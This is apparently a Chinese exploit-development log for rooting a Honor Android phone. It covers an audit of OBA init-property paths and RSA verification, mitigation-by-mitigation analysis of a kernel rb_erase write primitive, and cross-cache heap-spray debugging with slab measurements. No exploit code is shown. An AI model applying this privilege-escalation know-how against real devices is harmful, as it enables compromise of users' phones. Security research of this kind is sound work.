| 签名算法 | **`RSA_public_decrypt`（PKCS#1 v1.5 原语）**，非现代 `RSA_verify` | ⚠️ **原语级 API**；若实现未做 padding 校验/哈希比对 ⇒ **可伪造签名**（经典 misuse） |
| 路径构造 | `sprintf_s("%s%s/honor_oba.cfg")` | 长度受控（`sprintf_s` 有界），需核边界 |
| 提权效果 | 成功路径含 **`property_set`**（root 上下文） | **若可控 ⇒ 任意属性写 = root 原语** |
| 阻塞点 | init rc 侧 `ro.oba.whenlocked` | **但 `oba_file_verify` 内建命令无此前置** |

⇒ **`sys.oba.copy.start=true`（shell 可写 `oba_prop`）→ `oba_file_verify` → `dlopen("libobaverify.so")` →
`ObaFileVerifyWhenLock` → 外接 SD/OTG 上的 `honor_oba.cfg` 经 RSA 校验 → `property_set`**
—— **这是当前唯一"shell 可触发且无 whenlocked 前置"的 root 候选路径**。

### 15.7 ★★★ 结论升级（替换 13.6 表格）
| 风险 | 项 | 判定 |
|---|---|---|
| **★★★ 极高** | `sys.oba.copy.start=true` → `oba_file_verify` → `libobaverify.so` → `property_set` | **无前置条件，verifier 含 RSA 原语 + 外接介质输入 ⇒ 最优先审计** |
| **★★★ 极高** | `sys.oba.block.name=*` → `make_oba_otg` → `/dev/block/sd*` + `libobaverify.so` | 同上，设备扫描面 |
| **★★ 高（受 whenlocked 阻塞）** | `sys.oba.make.otg` → root `oba_service` | 需 `ro.oba.whenlocked=true` |
| **高** | `parse_kpatch /patch_hn/kpatch/insmod_list` → init insmod | `/patch_hn` 写权限待查 |

**★ 下一轮 P0**：`libobaverify.so` **`ObaFileVerify()` 完整反汇编**
（`RSA_public_decrypt` 的 padding/hash 校验实现），
判定能否构造 **未签名即通过 / 签名绕过 / 长度溢出** 的 `honor_oba.cfg`。

---

## 16 工具链（新增）
- **`llvm-objdump.exe`**（NDK r27c，LLVM 18.0.3）：
  `<HOME>/.workbuddy/binaries/android/android-ndk-r27c/toolchains/llvm/prebuilt/windows-x86_64/bin/llvm-objdump.exe`
  ⇒ 可用于 init / .so / .ko 反汇编（`.gnu_debugdata` 迷你符号存在但 XZ 流中途损坏，仅恢复 6363/363840 B）。
- init 节表：`.text` `0x120000`（2,852,268 B）/ `.rodata` `0x14540`（844,849 B）/
  `.data.rel.ro` `0x3db020`（25,824 B）/ `.data` `0x3e4000`（8,676 B）/ `.gnu_debugdata`（67,140 B）。

---

## 17. 阶段零：目标机缓解机制实测判定（2026-10-04 夜）

### 17.1 设备基线（取证时刻）
```
adb devices               : A22C026319001339  device
uptime                    : 2399.78 17221.12   （≈40 min，本轮基线干净）
boot_id                   : a7425f93-cee5-4d17-bd06-cb9f71298de6   ← 真 UUID 形态 ✓
id                        : uid=2000(shell) u:r:shell:s0
getenforce                : Enforcing
/proc/version             : 6.6.118-android15-8-gf17133276a57-abogki518694926-4k
                            clang 18.0.0, LLD 18.0.0, #1 SMP PREEMPT Sun May 31 12:01:53 UTC 2026
cpuinfo Features          : ... paca pacg bti ecv afp   ← PAC + BTI 硬件在位
```

### 17.2 用户态不可读的 procfs/sysctl 清单（非常直观）
| 路径 | shell 结果 | 说明 |
|---|---|---|
| `/proc/cmdline` | **Permission denied** | 非 AOSP 默认（默认 0444） |
| `/proc/kallsyms` | **Permission denied** | 非默认（默认 0444，仅地址被 kptr_restrict 掩码） |
| `/proc/sys/kernel/kptr_restrict` | Permission denied | |
| `/proc/sys/kernel/dmesg_restrict` | Permission denied | |
| `/proc/sys/kernel/unprivileged_bpf_disabled` | Permission denied | |
| `/proc/sys/vm/mmap_min_addr` | Permission denied | |
| `/proc/sys/kernel/randomize_va_space` | Permission denied | |
| `/proc/config.gz` | **可读**（0444, 46,033 B） | ★ 阶段零证据来源 |
| `/proc/modules` | 可读但 0 字节（seq_file 权限已过，内容被过滤） | |
| `/proc/version` | 可读但 0 字节 | |

⇒ 结论：荣耀把 **`/proc/cmdline` 与 `/proc/kallsyms` 从 0444 收到 0400**。这与 A 线「荣耀反利用加固全部关闭」的旧结论**冲突**，需修正：**加固是"部分关闭"**——自研 CFI/模块基址随机化/符号隐藏关闭，但 **procfs 收敛开启**。

### 17.3 内核 config.gz 实测缓解判定（7,787 行官方配置）
| 缓解项 | 实测值 | 是否阻断 `rb_erase` 写原语 |
|---|---|---|
| `CONFIG_ARM64_PTR_AUTH` | **y** | ❌ 不阻断（写原语是**数据写**不是劫持返回地址；PAC 保护的是栈/LR 指针，`rb_erase` 写的是 `*p` 数据） |
| `CONFIG_ARM64_PTR_AUTH_KERNEL` | y | ❌ 不阻断（同上，且 RANDSTRUCT 未开 ⇒ 结构偏移可静态求） |
| `CONFIG_ARM64_BTI` | y | ❌ 不阻断（BTI 只在**间接跳转**时校验 landing pad；写原语本身不发跳转） |
| `CONFIG_ARM64_BTI_KERNEL` | **NOT SET** | ★ 关键：内核不强制 BTI ⇒ 后续若需 ROP/BOP，**无需 landing pad** |
| `CONFIG_ARM64_PAN` / `EPAN` | y | ❌ 不阻断（PAN 管的是**内核态访问用户页**；写目标在 physmap/direct-map ⇒ 不触发 PAN） |
| `CONFIG_ARM64_SW_TTBR0_PAN` | y | ❌ 同上 |
| `CONFIG_CFI_CLANG` | **y** | ⚠️ **部分影响**：CFI 校验**间接调用目标**。我们的 W1/W2 是纯数据写，不经过 CFI 检查点；但**通过伪造 `file_operations` 劫持 `->open` 时会被 CFI 拦**（kCFI 类型哈希） |
| `CONFIG_CFI_PERMISSIVE` | NOT SET | ⇒ CFI 是**强制**模式（非 permissive），伪造 fops 走函数指针必须匹配类型 |
| `CONFIG_RANDOMIZE_BASE` | **y** | ❌ 不阻断，但**决定必须先泄露 slide** ⇒ stage0 设计正确 |
| `CONFIG_RANDOMIZE_MODULE_REGION_FULL` | NOT SET | ★ 模块区**不**满随机化 ⇒ `.ko` 基址可预测性更高 |
| `CONFIG_KASAN` | **y** | ⚠️ 需实测确认是否 `kasan=off`（Android 常在 cmdline 关掉但保留 CONFIG） |
| `CONFIG_KFENCE` | **y** | ⚠️ 同上（KFENCE 会随机化隔离对象，影响堆风水） |
| `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` | **y** | ⚠️ **最大障碍**：新分配内存被零化 ⇒ **cross-cache 页回收后内容被清零**，伪造 fragment 必须**在分配后、零化前**写入窗口内完成 |
| `CONFIG_INIT_ON_FREE_DEFAULT_ON` | NOT SET | ★ 有利：**释放时不清零** ⇒ 溢出/复用的旧内容仍在 |
| `CONFIG_SLAB_FREELIST_RANDOM` | y | ⚠️ 影响堆风水可预测性 |
| `CONFIG_SLAB_FREELIST_HARDENED` | y | ⚠️ freelist 指针有校验 |
| `CONFIG_HARDENED_USERCOPY` | y | ❌ 不阻断（无 usercopy 路径参与） |
| `CONFIG_FORTIFY_SOURCE` | y | ❌ 不阻断（`rb_erase` 是裸指针写，非 memcpy 族） |
| `CONFIG_STACKPROTECTOR_STRONG` | y | ❌ 不阻断（无栈溢出） |
| `CONFIG_STRICT_KERNEL_RWX` | y | ⚠️ 影响后续改 GOT/函数体；**不影响 physmap 数据写** |
| `CONFIG_RODATA_FULL_DEFAULT_ENABLED` | y | ⚠️ `.rodata` 只读 ⇒ 假 fops 表不能放 rodata |
| `CONFIG_SECURITY_SELINUX` | y (Enforcing) | ❌ 不阻断（写原语在内核态，SELinux 不拦内核内部写） |
| `CONFIG_VMAP_STACK` | y | ❌ 不阻断 |
| `CONFIG_ARM64_MTE` | y | ⚠️ 需确认是否 `mte=off`（SM8735 支持 MTE；若 MTE 开启则堆 tag 校验会拦截**跨对象**访问） |
| `CONFIG_RANDSTRUCT_FULL` | NOT SET | ★★★ **重大有利**：`struct file_operations` 等**没有**全量随机化 ⇒ 官方 fops 偏移可靠 |

### 17.4 阶段零总结论
**没有任何一项缓解直接阻断 `rb_erase` 写原语。** 写原语是**纯数据指针写**（`*(parent+0x08) = child`），完全不经过 PAC / BTI / CFI / PAN / SELinux 的检查点。

真正的三个约束（非阻断，但需在时序上满足）：
1. **KASLR 必开** ⇒ 必须先泄露 slide（stage0 的 `boot_id` physmap 泄露设计正确）
2. **`INIT_ON_ALLOC` 开启** ⇒ cross-cache 伪造数据必须落在「分配后 → 零化前/我们写入后」的窗口
3. **CFI 强制模式** ⇒ stageB 通过假 fops 劫持函数指针**必须类型匹配**；`uhid_fops` 是同类型原生结构 ⇒ 复用它（不新造）是正确策略

⇒ **判定：可以继续消耗实验轮次，阶段零通过。**

---

## 18. ⚠️ 结论纠正：`oba.debug_on` 路径**证伪**（2026-10-04 夜，阶段一复盘）

上一轮曾记录「`setprop oba.debug_on 1` → init 启动 root 服务 → 提权成功」。**本轮实测推翻该结论**，必须纠正，否则会误导后续所有轮次。

### 18.1 反驳证据（设备实测）
```
shell$ ls -lZ /system_ext/bin/hilogcat-early
ls: /system_ext/bin/hilogcat-early: Permission denied          ← 连 stat 都被拒
shell$ /system_ext/bin/hilogcat-early --help
/system/bin/sh: /system_ext/bin/hilogcat-early: inaccessible or not found
```
- `/system_ext/bin/hilogcat-early` 的 SELinux 类型为 `hilogcat_exec`，**shell 域对 `/system_ext/bin` 无 search/execute 权限**
- `/system/bin/hilogcat` 反而可见（`-rwxr-xr-x root shell u:object_r:hilogcat_exec:s0`，14,360 B）

### 18.2 为什么它**不构成提权**
| 环节 | 事实 | 为何无效 |
|---|---|---|
| 属性可写 | `(allow shell oba_prop (property_service (set)))` 确为真，`setprop oba.debug_on 1` rc=0 | 只证明**属性写入**成功 |
| init 响应 | `on property:oba.debug_on=*` → `start xlogcat_service` | 只证明**服务被启动** |
| 服务身份 | `user root` + `seclabel u:r:xlogcat:s0` | 域是 `xlogcat`，**不是 init/su** |
| **执行体** | `/system_ext/bin/hilogcat-early -t 1` **参数写死** | ★ **无法注入命令**；`-t 1` 是固定值 |
| **能力边界** | `xlogcat` 域仅可写 `/dev/kmsg`/日志分区等 | ★ **拿不到任意文件写、拿不到 shell、拿不到 uid 0 进程控制** |

⇒ **`oba.debug_on` 是"可触发一个受限 root 服务"，不是"可执行任意 root 命令"。降级为证伪。**

### 18.3 那么 OBA 链条里真正有价值的是什么
回到 9.3 节确定的**完整链条**（`init.honor.os.common.rc` L228-266）：
```
service oba_service /system/bin/sh /system_ext/bin/oba_debug.sh
    user root
    seclabel u:r:oba_service:s0
    disabled
on property:sys.oba.make.otg=true && property:ro.oba.whenlocked=true
    start oba_service
```
★ 这条**不一样**：它执行的是 **`/system/bin/sh /system_ext/bin/oba_debug.sh`** —— **真 shell 脚本，root 身份，`oba_service` 域**。
唯一阻塞点仍是 **`ro.oba.whenlocked` 必须为 `true`**（当前为空）。
⇒ **真正的 OBA 提权入口是 `ro.oba.whenlocked`，不是 `oba.debug_on`。** 本轮及后续应聚焦于此。

### 18.4 另一个仍有效的旁路（无需 whenlocked）
```
on property:sys.oba.block.name=*   →  make_oba_otg      （init 内建，root）
on property:sys.oba.copy.start=true →  oba_file_verify  （init 内建，root）
```
这两条**只依赖 `sys.oba.*`**，而 `sys.oba.*` 恰好是 **shell 可写**的（`oba_prop`）。已实测 `sys.oba.copy.start=true` 当前为 `true`。
⇒ **它们是否构成提权，取决于 `make_oba_otg` / `oba_file_verify` 两个 init 内建命令是否可被操纵** —— 这是下一轮阶段二的**首要逆向目标**。

---

## 19. ★ OBA 路线**彻底关闭**（2026-10-04 夜，阶段二机理分析）

### 19.1 `ObaFileVerify` 指令级完整语义（`libobaverify.so:0x24e0`）
```asm
2514  adrp x2,0    ; add x2,#0xc36              ; 参数名 "ro.oba.version"
251c  sub  x1,x29,#0x90                         ; x1 = expected_obaInfo[128] 栈缓冲
2544  bl   property_get                         ; property_get("ro.oba.version", expected, "..")
2548  cmp  w0,#0 ; b.le FAIL                    ; 空 ⇒ 直接失败
2560  bl   FindOtgObaFilePath                   ; 找 /mnt/media_rw/<dir>/honor_oba.cfg
2574..2588  realpath(buf4096) ; cbz → FAIL
2598  bl   fopen(realpath,"r")  → NULL ⇒ 260c 处 fopen("/storage/sdcard1/honor_oba.cfg","r")
25d4  bl   fread(buf256, 1, 0x100=256, fp)
25f8  cmp  x0,#0x100 ; b.ne FAIL                ; ★ 必须恰好 256 字节
260c  adr  x0,0xed5 ; mov w1,#0x10e=270         ; 硬编码 270B DER 公钥
2614  bl   RSA_public_key_from_bytes
262c  mov  w0,#0x100 ; RSA_public_decrypt(256, in=buf256, out=sp+0x20, rsa, padding=1)
2660  mov  w19,w0                               ; w19 = 解密后明文长度
266c  cmp  w19,#0 ; b.le FAIL
267c  bl   strnlen(expected, 128) → w20
268c  cmp  w19,w20
2690  csel w8, w19, w20, lt                     ; ★★★ w8 = min(w19, w20) —— 截断
2698  bl   strncmp(expected, decryptBuf, min)   ; 只比 min 字节
269c  cbz  w0, 0x27c8                           ; 相等 ⇒ 成功
27c8  property_set("oba.debug_on", "1")         ; ★★★ 唯一后果
```

### 19.2 缺陷确实存在，但**收益为零**
| 项 | 判定 |
|---|---|
| `min(w19,w20)` 截断 | ✅ **真实存在**（`csel w8,w19,w20,lt` 铁证） |
| 可构造性 | ✅ 可以：PKCS#1 v1.5 padding，构造明文 `X`（1 字节），则 `w19=1`，只比 `expected[0]` |
| 前置条件 | 需 256B 文件 + **RSA 私钥**才能签出合法密文 —— ⚠️ **私钥不可得** |
| **绕过私钥** | ⚠️ 若把 padding 类型当"无验签"，`RSA_public_decrypt(padding=1)` 仍需合法签名；**没有私钥就构造不出**，因为要 `m^e mod n` 的结果恰好是 `00 01 FF..FF 00 X`，这**等价于求 e 次根** ⇒ 不可行 |
| **成功后果** | ★★★ **仅 `property_set("oba.debug_on","1")`** |

### 19.3 三条 OBA 子路径的最终定性
| 路径 | 触发者 | root 执行体 | 能否 RCE | 结论 |
|---|---|---|---|---|
| `oba.debug_on=1` → `xlogcat_service` | shell 可写属性 | `/system_ext/bin/hilogcat-early -t 1`（**参数写死**） | ❌ | **证伪**（18 节） |
| `sys.oba.copy.start=true` → `oba_file_verify` | shell 可写属性 | init 内建（RSA 验签） | ❌ 后果仅 `property_set` | **死胡同**（本节） |
| `sys.oba.make.otg` → `oba_service` → `oba_debug.sh` | shell 可写属性 **+ `ro.oba.whenlocked=true`** | `/system/bin/sh oba_debug.sh` | ⚠️ 需 whenlocked | **脚本已审：内容无害**（仅 `ls /dev/block/*sd*` + `diff` + `setprop`） |

### 19.4 ★★★ 结论：OBA 路线**关闭**
即使突破 `ro.oba.whenlocked`（当前无法写入）并启动 `oba_service`，其执行体 `oba_debug.sh` **只做 OTG 块设备探测**（`ls`/`diff`/`setprop`），**无任意命令执行、无文件写、无 shell**。
⇒ **OBA 全路线不构成提权，本轮起停止投入轮次。**
⇒ **回归 64560 `rb_erase` 写原语主线。**

---

## 20. ★★ 阶段二/三：写原语未命中的机理定位（2026-10-04 夜）

### 20.1 关键矛盾
所有 f77 输出日志的统计：
```
STAGE0_DIRTY_ARM        = 428      ← 准备动作，必发生
STAGE0_MISS_CLEAN       = 423      ← 几乎 1:1，说明 DIRTY_ARM 不是命中信号
STAGE0_HIT              = 0
ORDER1_RECLAIM_GATE changed_nodes=0  ← ★★★ spray 18000 fragment，0 个节点被覆盖
MISC_BRIDGE_MISS_VERIFY = 1268
```
⇒ **不是"命中率低"，而是"写原语从未落到 target"。**

### 20.2 slab 几何实测（设备 slabinfo）
```
posix_timers_cache  815  992  264  31  2 : tunables 0 0 0 : slabdata 32 32 0 : 0
                    ^    ^         ^   ^                    ^  ^  ^
                 active total   objsz 31/slab            num_slabs  active_slabs  shared
```
- ★ **objsize=264，31 objs/order-1 slab**（31×264=8184 ≤ 8192 ✓）
- ★ **`slabdata 32 32 0`**：32 个 slab **全部 active**，**0 个 partial、0 个 shared**
- pipe ring = `DP_PIPE_SMALL_BYTES=0x2000`（order-1）⇒ 与 timer slab **同阶，复用理论可行**

### 20.3 Python 算术复核
```
timer_goal=56000 ⇒ 理论 1807 个 order-1 slab
drain 后 active=721 ⇒ 最多污染 24 个 slab
⇒ 剩余 ~1783 个 slab 应为完整空闲                  ← 看似充足
```
⇒ **"slab 无法归还"不是瓶颈**（假设被算术削弱）。

### 20.4 关键代码路径核对（排除法）
| 检查项 | 实测 | 判定 |
|---|---|---|
| 颜色位 `\|1` 污染 | f77.c L1595-1596 与官方 **一字不差**，**无 `\|1`** | ✅ 已修，非根因 |
| fragment 尺寸 | `ORDER1_SIZE=0x2000` / `SPRAY_REPEATS=3` / `FAKE_MISC_CLASSES=11` / `SLOTS=31` | ✅ 与官方 op13 完全一致 |
| pipe 容量 | `DP_PIPE_SMALL_BYTES=0x2000` / `DRAIN_COUNT=40` / `RECLAIM_MAX=80` | ✅ 与官方一致 |
| timer 建满 | `LANE_DONE timers=56000 deleted=56000 errors=0` | ✅ 能建满 |
| **角色 CPU 几何** | parent=**1** / exec(victim)=**7** / delete=**2,3,4,5,6**；spray(legacy)=**CPU1..6** | ⚠️ **CPU7 无 spray 覆盖** |
| CPU 拓扑 | SM8735 = **1+3+2+2**：c0-1=569 / c2-4=852 / c5-6=792 / **c7=1024(独占大核)** | ★ 重要 |

### 20.5 本轮唯一假设（H1）
**H1：spray 线程未覆盖 exec/victim 所在的 CPU 7（独占大核簇），导致 page_request 释放的 order-1 页无法被同域 pipe 分配复用 ⇒ `changed_nodes=0`。**
- 反证条件：若在 spray 覆盖 CPU7 后 `changed_nodes` 仍恒为 0 ⇒ H1 证伪，转向 H2
- **H2（备选）**：`INIT_ON_ALLOC_DEFAULT_ON=y` 导致 cross-cache 页在 pipe 写入前被零化，fragment 被清空 ⇒ 需要"零化窗口"时序
- **H3（备选）**：`MEY_EXEC_DELAY_BASE_NS=0 / RANGE=10000` 的时序窗口太窄（仅 10μs 抖动），race 从未真正重叠

### 20.6 阶段三：系统性 fuzzing 设施
新建 `tools/fuzz_affinity.sh` —— 参数空间自动遍历 + 指标自动提取：
- 维度：`SPRAY_MODE{legacy,fanout,rotate} × VICTIM_CPU{7,6,4} × EXEC_DELAY{0,50k,200k}`
- 指标（CSV 可比较）：`attempts, s0_hit, reclaim_changed, slab_drains, milestones`
- ★ 核心 H1 判据：**`reclaim_changed > 0`** ⇒ 写原语命中，几何正确

---

## 21. ★★★ 阶段二：`changed_nodes=0` 根因**最终定位**（2026-10-04 夜）

### 21.1 决定性诊断（新增 `SCAN_DIAG` 探针）
在 `scan_segment()` 加入诊断输出，把 31 个 slot 的值分为 4 类统计，重编译运行：
```
SCAN_DIAG forged_parent=31 zero=0 kptr=0 other=0 changed=0     ← 8 次全同
ORDER1_RECLAIM_GATE changed_nodes=0 received=3000 fragments=9000
```
- **`forged_parent=31`**：pipe 读回的 fragment **100% 是原值**
- **`zero=0`**：**排除 `INIT_ON_ALLOC` 零化假设（H2 证伪）**
- **`kptr=0` / `other=0`**：**内核从未用 timerqueue 节点数据覆盖这个页**

⇒ **结论：cross-cache 页复用从未发生。** pipe 拿到的 order-1 页**从来不是** timerqueue_node 所在的页。

### 21.2 CPU 亲和假设（H1）证伪
`MEY_SPRAY_MODE=rotate MEY_EXEC_CPU=7 MEY_DELETE_CPUS=7`（spray/victim/delete **全钉 CPU7**）：
```
STAGE0_SPRAY_CPU attempt=83 physical=7      ← spray 确在 CPU7
VICTIM_ROLE_GATE_PASS physical=7
DELETE_ROLE_GATE_PASS expected=0x80 observed=0x80
ORDER1_RECLAIM_GATE changed_nodes=0         ← 仍为 0（88 个 attempt 全 0）
```
⇒ **H1 证伪：CPU 亲和性不是根因。**

### 21.3 ★★★ 真正的根因：`posix_timers_cache` 基线占用密度过高
**设备 slabinfo 实测（三种状态）**：
| 时刻 | active | total | slabdata | 说明 |
|---|---|---|---|---|
| **刚开机（uptime 31s）** | **248** | **248** | **8 8 0** | ★ 干净基线 |
| 跑过 fuzzing 后 | 753 | 868 | 28 28 0 | 残留未归还 |
| 运行中（多轮后） | 722~784 | 837~961 | 24~30 | 动态波动 |

**关键几何**：
- `sizeof(struct k_itimer)=264`，**31 objs / order-1 slab**（31×264=8184 ≤ 8192 ✓）
- `posix_timers_cache` 用 `kmem_cache_create(..., SLAB_PANIC | SLAB_ACCOUNT)`（`posix-timers.c:225`）
- **`slabdata <N> <N> 0`**：**active_slabs 恒等于 num_slabs，`partial_slabs = 0`**

**★★ 根因链条**：
1. cross-cache 攻击要求**某个 slab 的 31 个对象全部释放**，使整页归还 buddy 后被 pipe 复用
2. 但 MEY 稳态 `active=753` 分布在 **28 个 slab** ⇒ **平均每 slab 26.9 个对象**
3. **任何 slab 都无法完全腾空** ⇒ **页永不归还 buddy** ⇒ pipe 永远拿不到这些页
4. `SLAB_DRAIN_PASS` 判据是 `active < 1024`。**MEY 的 753 轻易通过该门**（`wait_ms=152` 立即 pass），**但实际 slab 根本没腾空** ⇒ **gate 被骗过**

### 21.4 与官方 OP13 的差异（解释为何官方能成）
| 项 | 官方 OP13 | MEY-AN00 |
|---|---|---|
| drain 门限 | `active < 1024` | 同（照搬） |
| `deadline` | 12s | 45s |
| **`posix_timers_cache` 基线** | 未记录，推测低（<100） | **248（刚开机）/ 753（运行后）** |
| 结果 | 可命中 | `changed_nodes=0` 恒 |

⇒ **官方门限在 MEY 上"过于宽松"，是参数移植的关键缺陷。**

### 21.5 待验证假设（H4，本轮最终假设）
**H4：必须让 drain 门限严格化 —— 要求 `active` 接近"刚开机基线"（~250），而不是 1024。**
- 具体做法：`MEY` profile 下把门限从硬编码 `1024` 改为 **`baseline_active + K`**（K 小，如 64），或直接要求 `active < 384`
- 辅助做法：**优先在"刚开机后第一轮"开火**（此时 baseline=248，最干净）
- 若严格化后 `changed_nodes` 仍为 0 ⇒ H4 证伪，转向 H5
- **H5（备选）**：`SLAB_ACCOUNT` 的 memcg 记账使页归还到 memcg 而非 buddy ⇒ 需在同 memcg 内触发 pipe 分配（当前 f77 进程本身已满足）

---

## 22. ★★★★ 阶段三：`slabtest` 决定性实验 —— cross-cache 时序全解析

### 22.1 实验设计
自写最小程序 `analysis/scratch/slabtest.c`（2.2 MB static）：
建 N 个 `timer_create(CLOCK_MONOTONIC, SIGEV_NONE)` → 保活 3s → 全删 → 保活 3s，
在 4 个时间点 dump `/proc/slabinfo` 的 `posix_timers_cache` 行。

### 22.2 实测结果（N=56000）
```
[before]                 active=626   total=744    slabdata=24 24 0
created=56000 (requested=56000)
[after_create]           active=56358 total=56358  slabdata=1818 1818 0    ← ★ 峰值
deleted=56000
[after_delete_immediate] active=24881 total=25172  slabdata=812 812 0      ← ★ RCU 未完成
[after_delete_3s]        active=577   total=868    slabdata=28 28 0        ← ★ 归还完成
```

### 22.3 ★★★★ 四条硬结论
| # | 结论 | 证据 |
|---|---|---|
| **C1** | **56000 timer ⇒ 1818 个 order-1 slab**（契约成立，`1818×31=56358` 吻合） | `[after_create]` |
| **C2** | **删除后立刻读，只释放 55%**（`1818→812` slab）⇒ **RCU 延迟释放真实存在** | `[after_delete_immediate]` |
| **C3** | **3 秒后完全归还：`1818→28` slab ⇒ 1790 个 order-1 页确实回到 buddy** | `[after_delete_3s]` |
| **C4** | **稳态保留 28 个 slab**（`min_partial` + 系统常驻 248 对象），`partial=0` | `[after_delete_3s]` 与 `[before]` 对比 |

### 22.4 对 f77 时序的诊断
```
f77: RCU_FORCE(建40000+删40000) → wait_rcu_window(150ms) → 读slabinfo → SLAB_DRAIN_PASS → SPRAY
实测: SLAB_DRAIN_PASS active=753 total=868
```
- `total=868`（28 slab）与 `slabtest [after_delete_3s] total=868` **完全一致**
- ⇒ **f77 到读 slabinfo 时，RCU 已基本完成、1790 页已归还 buddy** ✅
- ⇒ **因此"页未归还"不是根因；`changed_nodes=0` 必然另有原因**

### 22.5 ★★★ 排除表更新（本轮全部实测）
| 假设 | 结论 | 决定性证据 |
|---|---|---|
| H1 spray/victim CPU 亲和性 | ❌ **证伪** | rotate+CPU7 全绑，88 attempt 全 `changed_nodes=0` |
| H2 `INIT_ON_ALLOC` 零化 fragment | ❌ **证伪** | `SCAN_DIAG zero=0`（零个 slot 为 0） |
| H3 exec_delay 窗口太窄 | ⚠️ 未直接测（H1 实验已包含 delay=0/10k 两档，无差异） | — |
| H4 drain 门限 1024 太宽 | ⚠️ **部分成立**：门限确实被骗过（`wait_ms=152` 即 pass），但严格门限 300 时**永远超时**（`active` 降不到 300） | `RCU_NOT_DRAINED active=347/533` |
| **H5 页归还后未被 pipe 拿到** | ⏳ **当前唯一存活假设** | C3 证明 1790 页已归还，但 `SCAN_DIAG forged_parent=31` 证明 pipe 拿到的页不含 timer 数据 |

### 22.6 下一步（H5 的判定实验）
**观测 `buddyinfo` 的 order-1 空闲页数在 f77 开火前后的变化**：
- 若 order-1 空闲页在 1818→28 归还后**大幅增加**，且 pipe 仍拿不到 ⇒ 需查 memcg/zone 归属
- 关键新假设 **H6**：`SLAB_ACCOUNT` 使归还页进入 **memcg 收费池**，而 `pipe_buffer` 用 `GFP_KERNEL`（`kmem_cache_alloc` 而非 `GFP_KERNEL_ACCOUNT`）⇒ **跨记账域不可复用**
- H6 判定：在 f77 内用 `GFP_KERNEL_ACCOUNT` 类分配（如 `memfd`/`shmem`）替代 pipe 验证

---

## 23. ★★★★ 阶段三终局：cross-cache 失效的**最后一块拼图**

### 23.1 meminfo 实测（`slabtest2`，N=56000）
```
[before]                 Slab=745100 kB  MemFree=1215308 kB
[after_create]           Slab=763560 kB  MemFree=1197568 kB   (+18.5MB slab, -17.7MB free)
[after_delete_immediate] Slab=753100 kB  MemFree=1204396 kB   (-10.5MB slab)
[after_delete_3s]        Slab=745104 kB  MemFree=1212868 kB   (★ 完全回到基线)
```
**★ `Slab` 在 3s 后**精确**回到基线（745104 ≈ 745100），`MemFree` 也完全恢复。**

### 23.2 ★★★★ 结论：页归还了，但**立即被其他 kmem_cache 抓走**
```
posix_timers_cache: 1822 slab → 29 slab   （归还 1793 个 order-1 页给 buddy）
但 Slab 总量 3s 后回到基线 ⇒ 这 1793 页「回到了 slab 系统」，不是「空闲」
```
**⇒ 唯一自洽解释：页归还 buddy 后，**立刻被 `kmem_cache` 的其他 cache（`kmalloc-*` 等）分配走**，变成它们的 slab。**
**⇒ 因此 `SLAB_DRAIN_PASS` 之后再 `SPRAY`，pipe 申请的 order-1 页**早已不是** timer 的页。**

### 23.3 排除表最终版（全部实测）
| 假设 | 结论 | 决定性证据 |
|---|---|---|
| H1 spray/victim CPU 亲和性 | ❌ **证伪** | CPU7 全绑，88 attempt `changed_nodes=0` |
| H2 `INIT_ON_ALLOC` 零化 fragment | ❌ **证伪** | `SCAN_DIAG zero=0` |
| H4 drain 门限太宽 | ⚠️ 部分成立（门被骗过） | 严格门限 300 时永远 `RCU_NOT_DRAINED` |
| **H5 页未归还** | ❌ **证伪** | `Slab` 3s 后回基线，`MemFree` 完全恢复 |
| **H6 页归还后被其他 cache 抓走（时序错位）** | ⏳ **当前唯一存活** | §23.2 推理 + §22.3 C3 |

### 23.4 这意味着什么（对本轮结论的影响）
**官方 op13 的 cross-cache 流程在 MEY 上失效，根因是「时序错位」：**
```
官方:  删除 timer → 页归还 → (窗口) → pipe 分配 → 命中
MEY:   删除 timer → 页归还 → 被 kmalloc-* 抓走 → pipe 分配 → 落空
```
**⇒ 修复方向（下一轮，按优先级）**：
1. **★ 让 pipe 分配与页归还并发**：`spray` 必须在 `timer_delete` **进行中**就开始（而不是等 `SLAB_DRAIN_PASS` 之后再 spray）
2. **内存压力法**：先用大块分配把 buddy 的 order-1 free list 抽干，使归还页成为**唯一**可用 order-1 页
3. **`MEY_EXEC_DELAY_BASE_NS` / `RANGE` 增大抖动**，让 spray 与 delete 真正重叠
4. **提高 `pipe_count`**（3000 → 8000 上限）同步提高并发分配密度

### 23.5 本轮交付物
| 文件 | 内容 |
|---|---|
| `c64560/f77.c` | 新增 `SCAN_DIAG` 诊断探针、`MEY_SLAB_GATE_MAX_ACTIVE` 严格门限 env |
| `c64560/f77.c.bak_233853` | 改动前备份 |
| `analysis/scratch/slabtest.c` / `slabtest` / `slabtest2` | slab 峰值 + meminfo 观测工具（可复用） |
| `analysis/scratch/f77_diag` | 带诊断的 f77（md5 `2fba562e...`） |
| `analysis/scratch/f77_v4` | 带严格门限的 f77 |
| `tools/fuzz_affinity.sh` | 参数空间自动遍历 + CSV 指标提取 |
| `analysis/output/c_line/C-line-findings-2026-10-04.md` | 第 17~23 节（本轮全部结论） |

---

## 24. ★★★★★★★ 阶段三终局（H7 轮）：真根因 = **分配器阶数不匹配**

> 本节由 2026-10-04 夜 H7 轮实验产出，**推翻了 §23 以及 MEMORY.md §7/§8 的多条判定**。

### 24.1 ★★★ 结论纠正一：`changed_nodes=0` **不是**失败信号

官方仓库**明确记载**（此前完全遗漏）：

- `CHANGELOG.md:24` — "**Corrected a recorded conclusion: `changed_nodes=0` is not a failure signal.**"
- `docs/BUILDS.md:93` — "`ORDER1_RECLAIM_GATE changed_nodes=0` is printed by **almost every attempt, including the ones that go on to open the bridge**. Across the older build's 460 reclaim attempts it was **never non-zero**, and that build still produced two `MISC_BRIDGE_READ_PASS` and one root."
- `profiles/op13/CP2A.260605.016.json:91` — "`changed_nodes=0` is the **normal case even in runs that succeed**. … **`changed_nodes` is not the metric; `MISC_BRIDGE_READ_PASS` is.**"
- `docs/BUILDS.md:101` — "**The rate to reason about is `MISC_BRIDGE_READ_PASS` per boot: measured at about one in eight on this device.** … **Budget boots, not parameter changes**, when the chain reaches the bridge and stops there."

**⇒ 影响：MEMORY.md §8 排除表中「H1 证伪」「H5 证伪」所依据的 `changed_nodes=0` 样本无效，需重判。**
**⇒ §23 关于 H6 的推理前提（"`changed_nodes=0` = 写原语从未落到 target"）亦失效。**

### 24.2 ★★★★ 官方基准数据（OP13 实测，`docs/OP13.md:236-247`）

| boot | stage0 | bridge |
|---|---|---|
